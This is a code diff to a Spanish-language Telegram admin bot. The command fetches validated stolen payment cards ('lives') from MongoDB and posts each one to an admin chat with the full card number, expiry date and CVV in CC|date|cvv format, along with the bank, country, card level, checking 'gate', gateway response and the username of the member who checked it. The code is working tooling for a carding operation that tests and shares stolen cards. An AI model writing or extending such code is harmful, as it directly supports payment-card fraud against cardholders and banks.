@@ -774,59 +774,44 @@ const adminCommands = {
             }
 
             let lives;
-            let mensaje;
+            const livesCollection = mongoose.connection.db.collection('lives');
 
-            try {
-                const livesCollection = mongoose.connection.db.collection('lives');
+            // Si no hay argumentos, mostrar las últimas 10 lives generales
+            if (!args || args.length === 0) {
+                lives = await livesCollection.find()
+                    .sort({ fechaEncontrada: -1 })
+                    .limit(10)
+                    .toArray();
+            } 
+            // Si hay un username, buscar por ese usuario
+            else {
+                const username = args[0];
+                lives = await livesCollection.find({ 'checkedBy.username': username })
+                    .sort({ fechaEncontrada: -1 })
+                    .limit(10)
+                    .toArray();
+            }
 
-                // Si no hay argumentos, mostrar las últimas 10 lives generales
-                if (!args || args.length === 0) {
-                    lives = await livesCollection.find()
-                        .sort({ fechaEncontrada: -1 })
-                        .limit(10)
-                        .toArray();
-                    mensaje = `🔍 *Últimas 10 Lives Encontradas*\n\n`;
-                } 
-                // Si hay un username, buscar por ese usuario
-                else {
-                    const username = args[0];
-                    lives = await livesCollection.find({ 'checkedBy.username': username })
-                        .sort({ fechaEncontrada: -1 })
-                        .limit(10)
-                        .toArray();
-                    mensaje = `🔍 *Lives encontradas por usuario ${username}*\n\n`;
-                }
+            if (!lives || lives.length === 0) {
+                await adminBot.sendMessage(msg.chat.id, '❌ No se encontraron lives');
+                return;
+            }
 
-                if (!lives || lives.length === 0) {
-                    await adminBot.sendMessage(msg.chat.id, '❌ No se encontraron lives', {
-                        chat_id: msg.chat.id
-                    });
-                    return;
-                }
+            // Enviar cada live en un mensaje separado
+            for (const live of lives) {
+                const mensaje = `💳 *LIVE ENCONTRADA*\n\n` +
+                    `CC: ${live.tarjeta.numero}|${live.tarjeta.fecha}|${live.tarjeta.cvv}\n` +
+                    `🏦 Banco: ${live.detalles.banco}\n` +
+                    `🌍 País: ${live.detalles.pais}\n` +
+                    `💠 Nivel: ${live.detalles.nivel}\n` +
+                    `🔄 Gate: ${live.detalles.gate}\n` +
+                    `💬 Respuesta: ${live.detalles.respuesta}\n` +
+                    `👤 Checker: ${live.checkedBy.username || 'Unknown'}\n` +
+                    `⏰ Fecha: ${new Date(live.fechaEncontrada).toLocaleString()}`;
 
-                mensaje += lives.map(live => 
-                    `💳 *Tarjeta:* ${live.tarjeta.numero}\n` +
-                    `📅 *Fecha:* ${live.tarjeta.fecha}\n` +
-                    `🏦 *Banco:* ${live.detalles.banco}\n` +
-                    `🌍 *País:* ${live.detalles.pais}\n` +
-                    `💠 *Nivel:* ${live.detalles.nivel}\n` +
-                    `🔄 *Gate:* ${live.detalles.gate}\n` +
-                    `💬 *Respuesta:* ${live.detalles.respuesta}\n` +
-                    `👤 *Checker:* ${live.checkedBy.username}\n` +
-                    `⏰ *Fecha:* ${new Date(live.fechaEncontrada).toLocaleString()}\n`
-                ).join('\n───────────────\n\n');
-
-                // Dividir mensaje si es muy largo (límite de Telegram)
-                const chunks = mensaje.match(/.{1,4000}/g) || [];
-                for (const chunk of chunks) {
-                    await adminBot.sendMessage(msg.chat.id, chunk, {
-                        parse_mode: 'Markdown'
-                    });
-                }
-
-            } catch (dbError) {
-                console.error('Error accediendo a la colección:', dbError);
-                await adminBot.sendMessage(msg.chat.id, '❌ Error accediendo a la base de datos');
+                await adminBot.sendMessage(msg.chat.id, mensaje, {
+                    parse_mode: 'Markdown'
+                });
             }
 
         } catch (error) {
